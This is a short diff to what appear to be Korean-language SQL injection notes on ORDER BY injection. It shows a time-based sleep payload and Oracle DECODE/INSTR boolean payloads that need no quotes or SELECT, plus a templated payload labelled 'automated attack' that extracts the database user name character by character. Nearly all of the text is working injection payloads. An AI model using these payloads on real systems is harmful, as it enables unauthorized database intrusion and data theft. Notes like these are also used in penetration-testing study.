@@ -16,9 +16,12 @@ DESC, (select sleep(3)) -- -
 
 
 ## oracle
-정렬파라미터
+정렬부분(쿼터, SELECT 없이 )
 ->
 DECODE(INSTR(CHR(65),CHR(65),1,1),1,TRUE값,FALSE값)
+
 DECODE(INSTR(CHR(65),CHR(66),1,1),1,TRUE값,FALSE값)
+
 ->자동화 공격
+
 DECODE(INSTR(USER,CHR({ascii_code}),{pos},1),{pos},TRUE값,FALSE값)
